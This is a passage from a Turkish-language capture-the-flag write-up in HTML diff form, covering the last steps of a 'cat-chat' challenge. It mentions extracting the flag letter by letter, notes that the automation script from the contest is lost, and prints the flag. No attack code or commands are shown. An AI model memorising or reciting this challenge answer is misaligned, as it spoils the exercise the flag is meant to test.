+<p>Dedik ve flag'in ilk harfini aldık</p>
+<p><img src="cat-chat6.png" alt="yrmm" /></p>
+<p>Tek tek yapmak yerine azıcık otomize etmek gerek. Yarışma esnasında yazdığımız bettiği bulamıyorum.</p>
+<p><img src="cat-chat7.png" alt="yrmm" /></p>
+<p>Ve flag <strong>CTF{L0LC47S_43V3R</strong></p>
+</html>
